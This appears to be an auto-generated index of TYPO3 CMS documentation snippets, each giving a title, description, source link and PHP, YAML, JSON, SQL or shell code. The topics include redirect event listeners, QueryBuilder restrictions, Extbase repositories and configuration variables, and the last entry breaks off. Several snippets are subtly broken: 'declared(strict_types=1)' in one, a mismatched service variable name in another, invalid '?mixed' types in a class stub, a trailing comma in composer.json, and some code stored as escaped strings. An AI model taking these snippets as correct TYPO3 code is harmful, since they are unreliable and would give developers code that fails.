https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/BeforeRedirectMatchDomainEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n use TYPO3\\CMS\\Redirects\\Event\\BeforeRedirectMatchDomainEvent;\n\n/**\n * Listener that sets a custom redirect for specific request paths and sites.\n */\nfinal class MyEventListener\n{\n    public function __invoke(BeforeRedirectMatchDomainEvent $event): void\n    {\n        // Skip if a matching redirect was already found\n        if ($event->getMatchedRedirect() !== null) {\n            return;\n        }\n\n        $host = $event->getRequest()->getUri()->getHost();\n        $requestPath = $event->getRequestPath();\n\n        // Only react on a specific site and request path\n        if ($host !== 'www.example.org' || $requestPath !== '/explore') {\n            return;\n        }\n\n        // Fetch a page uid\n        $queryBuilder = GeneralUtility::makeInstance(ConnectionPool::class)\n            ->getQueryBuilderForTable('pages');\n\n        $pageUid = $queryBuilder\n            ->select('uid')\n            ->from('pages')\n            ->where(\n                $queryBuilder->expr()->eq(\n                    'slug',\n                    $queryBuilder->createNamedParameter('/explorer')\n                )\n            )\n            ->executeQuery()\n            ->fetchOne();\n\n        if ($pageUid) {\n            // Create a custom sys_redirect record - important: Set all fields the Core uses\n            $redirect = [\n                'uid' => 0, // Set a proper uid to be able to identify the redirect\n                'pid' => 0,\n                'updatedon' => time(),\n                'createdon' => time(),\n                'disabled' => false,\n                'source_host' => $host,\n                'source_path' => $requestPath,\n                'is_regexp' => false,\n                // Build proper link to page with language\n                'target' => 't3://page?uid=' . $pageUid . '&L=0',\n                'target_statuscode' => 307,\n                'respect_query_parameters' => true,\n            ];\n\n            $event->setMatchedRedirect($redirect);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying HiddenRestriction to Specific Tables in TYPO3 Database Query\nDESCRIPTION: This example demonstrates how to apply the HiddenRestriction only to the tt_content table when querying content with categories. It uses LimitToTablesRestrictionContainer to selectively apply restrictions to the 'tt' table alias.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder->getRestrictions()\n    ->removeByType(HiddenRestriction::class)\n    ->add(\n        GeneralUtility::makeInstance(LimitToTablesRestrictionContainer::class)\n            ->addForTables(GeneralUtility::makeInstance(HiddenRestriction::class), ['tt'])\n    );\n$queryBuilder->select('tt.uid', 'tt.header', 'sc.title')\n    ->from('tt_content', 'tt')\n    ->from('sys_category', 'sc')\n    ->from('sys_category_record_mm', 'scmm')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'scmm.uid_foreign',\n            $queryBuilder->quoteIdentifier('tt.uid')\n        ),\n        $queryBuilder->expr()->eq(\n            'scmm.uid_local',\n            $queryBuilder->quoteIdentifier('sc.uid')\n        ),\n        $queryBuilder->expr()->eq(\n            'tt.uid',\n            $queryBuilder->createNamedParameter($id, Connection::PARAM_INT)\n        )\n    );\n```\n\n----------------------------------------\n\nTITLE: Disabling Third-Party Query Restrictions in TYPO3\nDESCRIPTION: Demonstrates how to disable a query restriction added by a third-party extension by setting the 'disabled' option to true in the TYPO3 configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n$GLOBALS['TYPO3_CONF_VARS']['DB']['additionalQueryRestrictions'][\\Vendor\\Extension\\Database\\Query\\Restriction\\CustomRestriction::class]['disabled'] = true;\n\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic Tea Repository in TYPO3 Extbase\nDESCRIPTION: This snippet shows the minimal implementation of a repository class for the Tea model in TYPO3 Extbase. It extends the base Repository class and includes a PHPDoc comment for static analysis tools.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Repository.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace TTN\\Tea\\Domain\\Repository\\Product;\n\nuse TTN\\Tea\\Domain\\Model\\Product\\Tea;\nuse TYPO3\\CMS\\Extbase\\Persistence\\Repository;\n\n/**\n * @extends Repository<Tea>\n */\nclass TeaRepository extends Repository\n{\n}\n```\n\n----------------------------------------\n\nTITLE: Using DebugUtility to Debug Cookie Values in TYPO3\nDESCRIPTION: Example of using the TYPO3 Core's debug() function to output the contents of the $_COOKIE superglobal array. This function only produces output if the visitor's IP address matches the configured development IP mask.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Debugging/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\ndebug($_COOKIE);\n```\n\n----------------------------------------\n\nTITLE: Declaring an XCLASS in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates how to declare an XCLASS in TYPO3's ext_localconf.php file. It shows the syntax for overriding a core class with a custom class from an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Xclasses/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['Objects'][\\TYPO3\\CMS\\Backend\\Controller\\NewRecordController::class] = [\n    'className' => \\T3docs\\Examples\\Xclass\\NewRecordController::class\n];\n```\n\n----------------------------------------\n\nTITLE: Setting Base URL with Environment Variable in TYPO3 Site Configuration (YAML)\nDESCRIPTION: Demonstrates how to use an environment variable to set the base URL in a TYPO3 site configuration file. The BASE_DOMAIN environment variable is used to dynamically set the domain part of the URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UsingEnvVars.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nbase: 'https://%env(BASE_DOMAIN)%/'\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Services Configuration for Soft References\nDESCRIPTION: YAML configuration showing default soft reference parser registration in TYPO3 core.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  TYPO3\\CMS\\Core\\DataHandling\\SoftReference\\SubstituteSoftReferenceParser:\n    tags:\n      - name: softreference.parser\n        parserKey: substitute\n```\n\n----------------------------------------\n\nTITLE: Implementing RSS Feed Display Controller in TYPO3 CMS - PHP\nDESCRIPTION: Implements a controller action that generates an RSS feed of blog posts. The controller retrieves either a configured default blog or the first available blog, assigns it to the view, and returns an XML response with the rendered feed content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/View/CustomResponse.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\n\nclass PostController extends AbstractController\n{\n    /**\n     * Displays a list of posts as RSS feed\n     */\n    public function displayRssListAction(): ResponseInterface\n    {\n        $defaultBlog = $this->settings['defaultBlog'] ?? 0;\n        if ($defaultBlog > 0) {\n            $blog = $this->blogRepository->findByUid((int)$defaultBlog);\n        } else {\n            $blog = $this->blogRepository->findAll()->getFirst();\n        }\n        $this->view->assign('blog', $blog);\n        return $this->responseFactory->createResponse()\n            ->withHeader('Content-Type', 'text/xml; charset=utf-8')\n            ->withBody($this->streamFactory->createStream($this->view->render()));\n    }\n```\n\n----------------------------------------\n\nTITLE: Registering Icon for Custom Page Type\nDESCRIPTION: Registers the icon for the new Archive page type in the TYPO3 IconRegistry. This makes the icon available for use in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/CreateNewPageType.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'apps-pagetree-archive' => [\n        'provider' => \\TYPO3\\CMS\\Core\\Imaging\\IconProvider\\SvgIconProvider::class,\n        'source' => 'EXT:examples/Resources/Public/Icons/Archive.svg',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Restricting Password Reset for Admin Users in TYPO3\nDESCRIPTION: Configuration to prevent admin users from using the password reset functionality while keeping it enabled for regular users.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/PasswordReset/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['passwordResetForAdmins'] = false;\n```\n\n----------------------------------------\n\nTITLE: Retrieving Metadata UID in AfterFileMetaDataCreatedEvent in PHP\nDESCRIPTION: Method to get the unique identifier of the metadata record that was created. Returns an integer representing the metadata UID in the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataCreatedEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\npublic function getMetaDataUid(): int\n```\n\n----------------------------------------\n\nTITLE: Implementing Debug Action in TYPO3 Backend Controller\nDESCRIPTION: PHP implementation of a debugAction method in a backend controller. This code shows how to set up the module template, add variables to the view, and render a template for the debug action.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Debug action\n */\npublic function debugAction(ServerRequestInterface $request): string\n{\n    $this->setUpDocHeader();\n\n    $view = GeneralUtility::makeInstance(StandaloneView::class);\n    $view->setTemplatePathAndFilename('EXT:examples/Resources/Private/Templates/Module/Debug.html');\n    $view->assignMultiple([\n        'someVar' => 'This is a variable',\n        'anotherVar' => 'This is another variable',\n    ]);\n\n    return $view->render();\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching Specific Configuration Values\nDESCRIPTION: Demonstrates how to fetch specific configuration values directly using the `ExtensionConfiguration` API in PHP. It showcases retrieving a specific configuration value such as 'myVariable'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n\"<?php\\n\\nnamespace Vendor\\\\MyExtension\\\\Classes;\\n\\nuse TYPO3\\\\CMS\\\\Core\\\\Configuration\\\\ExtensionConfiguration;\\nuse Psr\\\\Http\\\\Message\\\\ServerRequestInterface;\\n\\nclass MyClass\\n{\\n    /**\\n     * @var string|null\\n     */\\n    protected ?string $loginLogo;\\n\\n    /**\\n     * @param ExtensionConfiguration $extensionConfiguration\\n     */\\n    public function __construct(\\n        ExtensionConfiguration $extensionConfiguration\\n    ) {\\n        $this->loginLogo = $extensionConfiguration->get('my_extension', 'loginLogo');\\n    }\\n\\n    public function doSomething(): ?string\\n    {\\n        return $this->loginLogo;\\n    }\\n}\\n\"\n```\n\n----------------------------------------\n\nTITLE: Global Configuration Example - TYPO3 Fileadmin Directory\nDESCRIPTION: Example of how to configure the default fileadmin directory location in TYPO3's global configuration\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/AccessControlOptions/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['fileadminDir']\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Placeholder Processors in PHP\nDESCRIPTION: Demonstrates how to register custom placeholder processors for YAML loading in TYPO3's system settings file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['yamlLoader']['placeholderProcessors']\n    [\\Vendor\\MyExtension\\PlaceholderProcessor\\CustomPlaceholderProcessor::class] = [];\n```\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['yamlLoader']['placeholderProcessors']\n    [\\Vendor\\MyExtension\\PlaceholderProcessor\\CustomPlaceholderProcessor::class] = [\n        'before' => [\n            \\TYPO3\\CMS\\Core\\Configuration\\Processor\\Placeholder\\ValueFromReferenceArrayProcessor::class\n        ],\n        'after' => [\n            \\TYPO3\\CMS\\Core\\Configuration\\Processor\\Placeholder\\EnvVariableProcessor::class\n        ],\n        'disabled' => false,\n    ];\n```\n\n----------------------------------------\n\nTITLE: Implementing Multiple Event Listeners in a Single TYPO3 PHP Class\nDESCRIPTION: Demonstrates how to use repeatable PHP attributes to register a single class for multiple events in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\AfterMailerSentMessageEvent;\n\n#[AsEventListener(\n    identifier: 'my-extension/before-mailer-sent'\n)]\n#[AsEventListener(\n    identifier: 'my-extension/after-mailer-sent',\n    event: AfterMailerSentMessageEvent::class\n)]\nfinal class MailerEventListener\n{\n    public function __invoke(BeforeMailerSentMessageEvent|AfterMailerSentMessageEvent $event): void\n    {\n        // Event handling logic\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Specific Token for tt_content Record Editing\nDESCRIPTION: Demonstrates how to create a specific token for editing a tt_content record, using the record's UID to make the token more specific.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormProtection/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$formToken = $formProtection->generateToken('tt_content', 'edit', (string)$uid);\n```\n\n----------------------------------------\n\nTITLE: Retrieving SiteConfigurationBeforeWriteEvent Methods in TYPO3 CMS\nDESCRIPTION: The SiteConfigurationBeforeWriteEvent class provides methods to access and modify site configuration before it is written to a YAML file. It includes methods to get the site identifier, retrieve the current configuration array, and set a new configuration array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/SiteConfigurationBeforeWriteEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Configuration\\Event;\n\nclass SiteConfigurationBeforeWriteEvent\n{\n    public function getSiteIdentifier(): string;\n    \n    public function getConfiguration(): array;\n    \n    public function setConfiguration(array $configuration);\n}\n```\n\n----------------------------------------\n\nTITLE: Using TYPO3 Service with File Type Subtype\nDESCRIPTION: Demonstrates how to instantiate a TYPO3 service for meta data extraction using a specific file type as subtype. The code creates a service instance, processes a file, and retrieves meta data output if successful.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/UseWithSubtypes.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Find a service for a file type\nif (is_object($serviceObject = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstanceService('metaExtract', $fileType))) {\n        $serviceObj->setInputFile($absFile, $fileType);\n        if ($serviceObj->process('', '', array('meta' => $meta)) > 0 && (is_array($svmeta = $serviceObj->getOutput()))) {\n                $meta = $svmeta;\n        }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing config paths using Environment class in TYPO3\nDESCRIPTION: This example shows how to use the Environment class to get configuration paths for settings and site configurations. The paths differ based on whether the installation is Composer-based or legacy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Environment/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Core\\Environment;\n\n// Composer-based installations: '/path/to/my-project/config/system/settings.php`\n// Legacy installations: '/path/to/my-project/typo3conf/system/settings.php'\n$pathToSetting = Environment::getConfigPath() . 'system/settings.php';\n\n// Composer-based installations: '/path/to/my-project/config/sites/mysite/config.yaml`\n// Legacy installations: '/path/to/my-project/typo3conf/sites/mysite/config.yaml'\n$pathToSiteConfig = Environment::getConfigPath() . 'sites/' . $siteKey . '/config.yaml';\n```\n\n----------------------------------------\n\nTITLE: Using expr() for Complex WHERE Clauses in TYPO3 Query Builder\nDESCRIPTION: Demonstrates the use of expr() method to create complex WHERE query parts. This example selects the uid from tt_content table where uid is greater than 42.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_27\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// SELECT `uid` FROM `tt_content` WHERE (`uid` > 42)\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->gt(\n            'uid',\n            $queryBuilder->createNamedParameter(42, Connection::PARAM_INT)\n        )\n    )\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Complete Project Composer Configuration\nDESCRIPTION: Full composer.json configuration combining VCS and local path repositories for a TYPO3 project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"repositories\": [\n        {\n            \"type\": \"vcs\",\n            \"url\": \"https://github.com/foo/bar.git\"\n        },\n        {\n            \"type\": \"path\",\n            \"url\": \"./packages/*\"\n        },\n    ],\n    \"extra\": {\n        \"typo3/cms\": {\n            \"web-dir\": \"public\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Soft Reference Parser Configuration\nDESCRIPTION: YAML configuration for registering a custom soft reference parser in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  Vendor\\MyExtension\\SoftReference\\YourSoftReferenceParser:\n    tags:\n      - name: softreference.parser\n        parserKey: myparser\n```\n\n----------------------------------------\n\nTITLE: Using Array Unpacking for Field Selection in TYPO3\nDESCRIPTION: Example showing how to use array unpacking to provide a list of fields to select when the fields are already available as an array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n// SELECT `uid`, `pid`, `aField`, `anotherField`\n$fields = ['uid', 'pid', 'aField', 'anotherField'];\n$queryBuilder->select(...$fields);\n```\n\n----------------------------------------\n\nTITLE: Assigning Objects in PHP Controllers\nDESCRIPTION: Shows how to assign an object in a PHP controller for use in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$this->view->assign('product', $myProduct);\n```\n\n----------------------------------------\n\nTITLE: Defining RouteResult Class for TYPO3 Backend Routing in PHP\nDESCRIPTION: This snippet defines the RouteResult class within the TYPO3\\CMS\\Backend\\Routing namespace. It includes methods for retrieving route information and implementing ArrayAccess for argument manipulation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/RouteResult.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Routing;\n\nclass RouteResult\n{\n    public function getRoute(): \\TYPO3\\CMS\\Backend\\Routing\\Route\n    {\n        // Implementation not shown\n    }\n\n    public function getRouteName(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getArguments(): array\n    {\n        // Implementation not shown\n    }\n\n    public function offsetExists(?mixed $offset): bool\n    {\n        // Implementation not shown\n    }\n\n    public function offsetGet(?mixed $offset): ?mixed\n    {\n        // Implementation not shown\n    }\n\n    public function offsetSet(?mixed $offset = '', ?mixed $value = ''): void\n    {\n        // Implementation not shown\n    }\n\n    public function offsetUnset(?mixed $offset): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Image Processing with ImageMagick or GraphicsMagick\nDESCRIPTION: This snippet enables the option for TYPO3 to use either ImageMagick or GraphicsMagick for image processing. This is a critical configuration for any operation that involves image manipulation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['processor_enabled'] = true;\n```\n\n----------------------------------------\n\nTITLE: Dumping MySQL Data into SQL File for TYPO3 Extension\nDESCRIPTION: This snippet provides a command to dump MySQL/MariaDB data into a static SQL file for TYPO3 extensions. It demonstrates the usage of the mysqldump command with required parameters like username, password, database name, and the table name. This operation is critical for creating static data that the TYPO3 framework can recognize and utilize.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTablesStaticAdtSql.rst#2025-04-16_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nmysqldump --user=[user] --password [database name] \\\n          [tablename] > ./ext_tables_static+adt.sql\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterAutoCreateRedirectHasBeenPersistedEvent Listener in PHP\nDESCRIPTION: Example implementation of an event listener for the AfterAutoCreateRedirectHasBeenPersistedEvent in TYPO3. The listener is structured as a PHP class that can react to newly persisted auto-created redirects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/AfterAutoCreateRedirectHasBeenPersistedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Redirects\\Event\\AfterAutoCreateRedirectHasBeenPersistedEvent\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Reports Module with Composer\nDESCRIPTION: Command to install the TYPO3 reports system extension which is required for viewing installed authentication services in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer require typo3/cms-reports\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition - AppendLinkHandlerElementsEvent\nDESCRIPTION: Class definition for AppendLinkHandlerElementsEvent in TYPO3 CMS Core. This event class allows listeners to intercept and modify link elements during the SoftRef parsing process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AppendLinkHandlerElementsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\DataHandling\\Event;\n\nclass AppendLinkHandlerElementsEvent {\n    public function getLinkParts(): array\n    public function getContent(): string\n    public function getElements(): array\n    public function getIdx(): int\n    public function getTokenId(): string\n    public function setLinkParts(array $linkParts)\n    public function setContent(string $content)\n    public function setElements(array $elements)\n    public function addElements(array $elements)\n    public function isResolved(): bool\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing TypoScript Config via Request Attributes in TYPO3\nDESCRIPTION: Demonstrates how to retrieve TypoScript configuration array and tree from the TYPO3 request object. This code accesses frontend.typoscript attributes that contain the processed configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyTypoScriptConfigEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$configArray = $request->getAttribute('frontend.typoscript')->getConfigArray();\n$configTree = $request->getAttribute('frontend.typoscript')->getConfigTree();\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Environment Settings Based on Application Context\nDESCRIPTION: Switch statement that sets different TYPO3 configuration variables based on the current application context. Controls error display and developer IP mask settings for Development, Production/Staging, and default environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Bootstrapping.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nswitch (\\TYPO3\\CMS\\Core\\Core\\Environment::getContext()) {\n   case 'Development':\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['displayErrors'] = 1;\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['devIPmask'] = '*';\n      break;\n   case 'Production/Staging':\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['displayErrors'] = 0;\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['devIPmask'] = '192.168.1.*';\n      break;\n   default:\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['displayErrors'] = 0;\n      $GLOBALS['TYPO3_CONF_VARS']['SYS']['devIPmask'] = '127.0.0.1';\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SQL table for Extbase model\nDESCRIPTION: Demonstrates the SQL definition for creating a table to be used by an Extbase model. It includes creating a table with specific columns and constraints. This SQL structure is typically defined in the EXT:ext_key/ext_tables.sql file and requires a corresponding TCA definition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Persistence.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tx_blogexample_domain_model_info (\n  name varchar(255) DEFAULT '' NOT NULL,\n  post int(11) DEFAULT '0' NOT NULL\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing Index Action in TYPO3 Extbase Controller with Dependency Injection\nDESCRIPTION: Implementation of an index action that lists all tea objects by retrieving them from the repository. It demonstrates dependency injection to access the repository and passing the retrieved objects to the view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Controller.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nprivate TeaRepository $teaRepository;\n\npublic function __construct(TeaRepository $teaRepository)\n{\n    $this->teaRepository = $teaRepository;\n}\n\npublic function indexAction(): ResponseInterface\n{\n    $allTeas = $this->teaRepository->findAll();\n    $this->view->assign('teas', $allTeas);\n    return $this->htmlResponse();\n}\n```\n\n----------------------------------------\n\nTITLE: Readonly Service Property Declaration in PHP\nDESCRIPTION: This snippet demonstrates how to declare a service with a readonly property using constructor injection in PHP. The readonly property `$someDependency` ensures that the dependency is only written once, typically in the constructor, enforcing immutability for that specific property.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Readonly.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n \"final class UserController\n    {\n        private string $someProperty = 'foo';\n\n        public function __construct(\n            private readonly SomeDependency $someDependency,\n        ) {}\n\n        // ...\n    }\"\n```\n\n----------------------------------------\n\nTITLE: Removing a Single Cache Tag in TYPO3 CMS (PHP)\nDESCRIPTION: This example demonstrates how to remove a specific cache tag from the frontend cache collector. It retrieves the cache collector from the request attributes and removes the specified cache tag.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Cache\\CacheTag;\n\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->removeCacheTags(\n    new CacheTag('tx_myextension_mytable_123'),\n);\n```\n\n----------------------------------------\n\nTITLE: Basic Fluid Template Example in HTML\nDESCRIPTION: Demonstrates a simple Fluid template with ViewHelpers, expressions, and conditions. It shows how to use variables, the if ViewHelper, and basic HTML structure.\nSOURCE: 